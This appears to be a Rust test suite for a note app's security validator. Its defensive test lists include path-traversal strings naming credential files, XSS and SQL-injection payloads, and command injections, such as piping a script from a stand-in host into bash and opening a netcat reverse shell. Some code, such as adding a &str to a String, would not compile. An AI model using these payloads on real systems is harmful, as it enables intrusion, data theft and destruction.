use std::sync::Arc;
use std::time::Duration;
use tempfile::tempdir;
use tokio::time::timeout;

use scratch_pad::database::DbService;
use scratch_pad::search::SearchService;
use scratch_pad::settings::SettingsService;
use scratch_pad::error::AppError;
use scratch_pad::models::Note;
use scratch_pad::security::{
    SecurityValidator, OperationContext, OperationSource, OperationCapability,
    FrequencyTracker
};

struct SecurityTestState {
    db_service: Arc<DbService>,
    search_service: Arc<SearchService>,
    settings_service: Arc<SettingsService>,
    validator: SecurityValidator,
    _temp_dir: tempfile::TempDir,
}

impl SecurityTestState {
    async fn new() -> Self {
        let temp_dir = tempdir().unwrap();
        let db_path = temp_dir.path().join("security_test.db");
        
        let db_service = Arc::new(DbService::new(db_path).unwrap());
        let search_service = Arc::new(SearchService::new(db_service.clone()));
        let settings_service = Arc::new(SettingsService::new(db_service.clone()));
        
        let validator = SecurityValidator::new();
        
        SecurityTestState {
            db_service,
            search_service,
            settings_service,
            validator,
            _temp_dir: temp_dir,
        }
    }
}

// Comprehensive security test suite covering all security features
#[tokio::test]
async fn security_test_suite() {
    let mut state = SecurityTestState::new().await;
    
    println!("🔒 Starting comprehensive security test suite...");
    
    // Test 1: Path Traversal Protection
    test_path_traversal_protection(&state).await;
    
    // Test 2: Input Validation
    test_input_validation(&state).await;
    
    // Test 3: Operation Context Validation
    test_operation_context_validation(&state).await;
    
    // Test 4: Frequency Controls
    test_frequency_controls(&mut state).await;
    
    // Test 5: IPC Security
    test_ipc_security(&state).await;
    
    // Test 6: Malicious Content Detection
    test_malicious_content_detection(&state).await;
    
    // Test 7: SQL Injection Prevention
    test_sql_injection_prevention(&state).await;
    
    // Test 8: Command Injection Prevention
    test_command_injection_prevention(&state).await;
    
    // Test 9: Capability Validation
    test_capability_validation(&state).await;
    
    // Test 10: File Operation Security
    test_file_operation_security(&state).await;
    
    println!("✅ All security tests completed successfully!");
}

async fn test_path_traversal_protection(state: &SecurityTestState) {
    println!("Testing path traversal protection...");
    
    let dangerous_paths = vec![
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/shadow",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "../../../../usr/bin/bash",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", // URL encoded
        "..%252f..%252f..%252fetc%252fpasswd",       // Double URL encoded
        "....//....//....//etc//passwd",             // Directory traversal with extra dots
        "../.\\./.\\../etc/passwd",                  // Mixed separators
        "file:///etc/passwd",                        // File protocol
        "\\\\server\\share\\file.txt",               // UNC path
        "aux.txt",                                   // Windows reserved name
        "con.log",                                   // Windows reserved name
        "prn",                                       // Windows reserved name
        "file.txt.",                                 // Trailing dot (Windows)
        "very_long_filename_that_exceeds_255_characters_" + &"a".repeat(300), // Long filename
    ];
    
    for dangerous_path in dangerous_paths {
        let result = state.validator.validate_export_path(dangerous_path, None);
        assert!(result.is_err(), "Path traversal attack should be blocked: {}", dangerous_path);
    }
    
    // Test valid paths
    let valid_paths = vec![
        "my-note.txt",
        "folder/note.md",
        "data.json",
        "backup-2024-01-20.csv",
    ];
    
    for valid_path in valid_paths {
        let result = state.validator.validate_export_path(valid_path, None);
        assert!(result.is_ok(), "Valid path should be allowed: {}", valid_path);
    }
    
    println!("✅ Path traversal protection working correctly");
}

async fn test_input_validation(state: &SecurityTestState) {
    println!("Testing input validation...");
    
    // Test note content validation
    let context = OperationContext::new_direct(vec![OperationCapability::WriteNotes]);
    
    // Valid content
    let valid_content = "This is a normal note with regular content.";
    assert!(state.validator.validate_note_content_with_context(valid_content, &context).is_ok());
    
    // Content too large
    let large_content = "a".repeat(2_000_000); // 2MB
    assert!(state.validator.validate_note_content_with_context(&large_content, &context).is_err());
    
    // Malicious content patterns
    let malicious_patterns = vec![
        "<script>alert('xss')</script>",
        "javascript:alert('xss')",
        "data:text/html,<script>alert('xss')</script>",
        "'; DROP TABLE notes; --",
        "${jndi:ldap://malicious.com/a}",
        "{{7*7}}",
        "<img src=x onerror=alert('xss')>",
    ];
    
    for malicious_content in malicious_patterns {
        let result = state.validator.validate_note_content_with_context(malicious_content, &context);
        assert!(result.is_err(), "Malicious content should be blocked: {}", malicious_content);
    }
    
    // Test search query validation
    let valid_queries = vec!["rust programming", "todo items", "meeting notes"];
    for query in valid_queries {
        assert!(state.validator.validate_search_query(query).is_ok());
    }
    
    let malicious_queries = vec![
        "'; DROP TABLE notes; --",
        "UNION SELECT * FROM sqlite_master",
        "' OR '1'='1",
        &"a".repeat(2000), // Too long
    ];
    
    for query in malicious_queries {
        assert!(state.validator.validate_search_query(query).is_err());
    }
    
    println!("✅ Input validation working correctly");
}

async fn test_operation_context_validation(state: &SecurityTestState) {
    println!("Testing operation context validation...");
    
    // Test valid contexts
    let valid_contexts = vec![
        OperationContext::new_cli(vec![OperationCapability::ReadNotes]),
        OperationContext::new_ipc(vec![OperationCapability::WriteNotes]),
        OperationContext::new_direct(vec![OperationCapability::ReadNotes, OperationCapability::WriteNotes]),
    ];
    
    for context in valid_contexts {
        assert!(state.validator.validate_operation_context(&context).is_ok());
    }
    
    // Test contexts exceeding capabilities
    let cli_context = OperationContext::new_cli(vec![OperationCapability::ManageSystem]);
    assert!(state.validator.validate_operation_context(&cli_context).is_err());
    
    let ipc_context = OperationContext::new_ipc(vec![OperationCapability::ManageSystem]);
    assert!(state.validator.validate_operation_context(&ipc_context).is_err());
    
    println!("✅ Operation context validation working correctly");
}

async fn test_frequency_controls(state: &mut SecurityTestState) {
    println!("Testing frequency controls...");
    
    let cli_context = OperationContext::new_cli(vec![OperationCapability::WriteNotes]);
    
    // Test CLI frequency limits (10 per minute)
    for i in 0..10 {
        let result = state.validator.validate_operation_context(&cli_context);
        assert!(result.is_ok(), "CLI operation {} should be allowed", i + 1);
    }
    
    // 11th operation should be blocked
    let result = state.validator.validate_operation_context(&cli_context);
    assert!(result.is_err(), "11th CLI operation should be blocked by frequency control");
    
    println!("✅ Frequency controls working correctly");
}

async fn test_ipc_security(state: &SecurityTestState) {
    println!("Testing IPC security...");
    
    let ipc_context = OperationContext::new_ipc(vec![OperationCapability::WriteNotes]);
    
    // Test IPC content validation
    let valid_content = "Regular IPC content";
    assert!(state.validator.validate_note_content_with_context(valid_content, &ipc_context).is_ok());
    
    // Test IPC size limits
    let large_content = "a".repeat(1_500_000); // 1.5MB
    assert!(state.validator.validate_note_content_with_context(&large_content, &ipc_context).is_err());
    
    println!("✅ IPC security working correctly");
}

async fn test_malicious_content_detection(state: &SecurityTestState) {
    println!("Testing malicious content detection...");
    
    let context = OperationContext::new_direct(vec![OperationCapability::WriteNotes]);
    
    let malicious_patterns = vec![
        "eval(atob('dmFyIGE9ZG9jdW1lbnQ='))", // Base64 encoded eval
        "Function('return process')().mainModule.require('child_process').exec('ls')",
        "new Function('return this')().process.mainModule.require('fs')",
        "%eval(base64_decode('ZXZhbA=='))",
        "{{constructor.constructor('return process')()}}", // Template injection
        "${java:version}", // Java expression
        "#{7*7}", // Expression language
        "/**/UNION/**/SELECT", // SQL with comments
        "javascript:void(0)",
        "vbscript:msgbox",
        "data:text/javascript,alert(1)",
        "moz-binding:url(http://ha.ckers.org/xssmoz.xml#xss)",
    ];
    
    for pattern in malicious_patterns {
        let result = state.validator.validate_note_content_with_context(pattern, &context);
        assert!(result.is_err(), "Malicious pattern should be detected: {}", pattern);
    }
    
    println!("✅ Malicious content detection working correctly");
}

async fn test_sql_injection_prevention(state: &SecurityTestState) {
    println!("Testing SQL injection prevention...");
    
    let injection_attempts = vec![
        "'; DROP TABLE notes; --",
        "' OR '1'='1' --",
        "'; INSERT INTO notes (content) VALUES ('hacked'); --",
        "UNION SELECT username, password FROM users",
        "'; PRAGMA foreign_keys=OFF; --",
        "'; ATTACH DATABASE '/etc/passwd' AS db; --",
        "1'; WAITFOR DELAY '00:00:10'; --",
        "' AND SUBSTR((SELECT name FROM sqlite_master WHERE type='table'),1,1)='n",
        "' UNION SELECT tbl_name FROM sqlite_master WHERE type='table'--",
        "'; DELETE FROM notes WHERE '1'='1'; --",
    ];
    
    for injection in injection_attempts {
        let result = state.validator.validate_search_query(injection);
        assert!(result.is_err(), "SQL injection should be blocked: {}", injection);
    }
    
    println!("✅ SQL injection prevention working correctly");
}

async fn test_command_injection_prevention(state: &SecurityTestState) {
    println!("Testing command injection prevention...");
    
    let context = OperationContext::new_direct(vec![OperationCapability::WriteNotes]);
    
    let command_injections = vec![
        "; ls -la",
        "| cat /etc/passwd",
        "&& rm -rf /",
        "$(whoami)",
        "`id`",
        "; curl http://malicious.com/steal.sh | bash",
        "&& nc -e /bin/sh malicious.com 4444",
        "| python -c 'import os; os.system(\"ls\")'",
        "; powershell.exe -Command Get-Process",
        "&& cmd.exe /c dir",
        "$(curl -s http://malicious.com/payload)",
        "`wget -qO- http://malicious.com/script.sh | sh`",
    ];
    
    for injection in command_injections {
        let result = state.validator.validate_note_content_with_context(injection, &context);
        assert!(result.is_err(), "Command injection should be blocked: {}", injection);
    }
    
    println!("✅ Command injection prevention working correctly");
}

async fn test_capability_validation(state: &SecurityTestState) {
    println!("Testing capability validation...");
    
    // Test CLI capabilities (limited)
    let cli_context = OperationContext::new_cli(vec![OperationCapability::ReadNotes]);
    assert!(state.validator.validate_operation_context(&cli_context).is_ok());
    
    let cli_system_context = OperationContext::new_cli(vec![OperationCapability::ManageSystem]);
    assert!(state.validator.validate_operation_context(&cli_system_context).is_err());
    
    // Test IPC capabilities (moderate)
    let ipc_context = OperationContext::new_ipc(vec![OperationCapability::WriteNotes]);
    assert!(state.validator.validate_operation_context(&ipc_context).is_ok());
    
    let ipc_system_context = OperationContext::new_ipc(vec![OperationCapability::ManageSystem]);
    assert!(state.validator.validate_operation_context(&ipc_system_context).is_err());
    
    // Test Direct capabilities (full)
    let direct_context = OperationContext::new_direct(vec![
        OperationCapability::ReadNotes,
        OperationCapability::WriteNotes,
        OperationCapability::DeleteNotes,
        OperationCapability::ManageSystem,
    ]);
    assert!(state.validator.validate_operation_context(&direct_context).is_ok());
    
    println!("✅ Capability validation working correctly");
}

async fn test_file_operation_security(state: &SecurityTestState) {
    println!("Testing file operation security...");
    
    // Test export path validation with different extensions
    let allowed_extensions = vec![
        "note.txt",
        "data.md",
        "backup.json",
        "export.csv",
        "content.html",
        "config.xml",
        "document.rtf",
    ];
    
    for filename in allowed_extensions {
        let result = state.validator.validate_export_path(filename, None);
        assert!(result.is_ok(), "Allowed extension should pass: {}", filename);
    }
    
    let blocked_extensions = vec![
        "script.js",
        "executable.exe",
        "shell.sh",
        "batch.bat",
        "python.py",
        "config.php",
        "data.sql",
    ];
    
    for filename in blocked_extensions {
        let result = state.validator.validate_export_path(filename, None);
        assert!(result.is_err(), "Blocked extension should fail: {}", filename);
    }
    
    println!("✅ File operation security working correctly");
}

#[tokio::test]
async fn test_concurrent_security_operations() {
    println!("Testing concurrent security operations...");
    
    let state = Arc::new(SecurityTestState::new().await);
    let mut handles = vec![];
    
    // Spawn multiple concurrent operations
    for i in 0..10 {
        let state_clone = state.clone();
        let handle = tokio::spawn(async move {
            let context = OperationContext::new_direct(vec![OperationCapability::WriteNotes]);
            let content = format!("Concurrent note {}", i);
            
            // This should not panic or cause race conditions
            let result = state_clone.validator.validate_note_content_with_context(&content, &context);
            assert!(result.is_ok());
        });
        handles.push(handle);
    }
    
    // Wait for all operations to complete
    for handle in handles {
        timeout(Duration::from_secs(5), handle).await.unwrap().unwrap();
    }
    
    println!("✅ Concurrent security operations working correctly");
}

#[tokio::test]
async fn test_security_under_load() {
    println!("Testing security under load...");
    
    let state = SecurityTestState::new().await;
    let start_time = std::time::Instant::now();
    
    // Perform 1000 security validations
    for i in 0..1000 {
        let context = OperationContext::new_direct(vec![OperationCapability::WriteNotes]);
        let content = format!("Load test note {}", i);
        
        let result = state.validator.validate_note_content_with_context(&content, &context);
        assert!(result.is_ok());
        
        // Test search query validation
        let query = format!("search term {}", i);
        let result = state.validator.validate_search_query(&query);
        assert!(result.is_ok());
    }
    
    let duration = start_time.elapsed();
    println!("✅ 1000 security validations completed in {:?}", duration);
    
    // Security operations should be fast (< 5ms per operation on average)
    assert!(duration.as_millis() < 5000, "Security operations taking too long: {:?}", duration);
}

#[tokio::test]
async fn test_edge_case_security_scenarios() {
    println!("Testing edge case security scenarios...");
    
    let state = SecurityTestState::new().await;
    let context = OperationContext::new_direct(vec![OperationCapability::WriteNotes]);
    
    // Test empty content
    assert!(state.validator.validate_note_content_with_context("", &context).is_ok());
    
    // Test whitespace-only content
    assert!(state.validator.validate_note_content_with_context("   \n\t  ", &context).is_ok());
    
    // Test unicode content
    let unicode_content = "Unicode test: 🚀 🔒 安全 мир שלום";
    assert!(state.validator.validate_note_content_with_context(unicode_content, &context).is_ok());
    
    // Test maximum allowed content size (just under 1MB)
    let max_content = "a".repeat(1_000_000 - 100);
    assert!(state.validator.validate_note_content_with_context(&max_content, &context).is_ok());
    
    // Test boundary conditions for search queries
    assert!(state.validator.validate_search_query("a").is_ok()); // Single character
    let long_query = "a".repeat(500); // Long but valid
    assert!(state.validator.validate_search_query(&long_query).is_ok());
    
    println!("✅ Edge case security scenarios working correctly");
}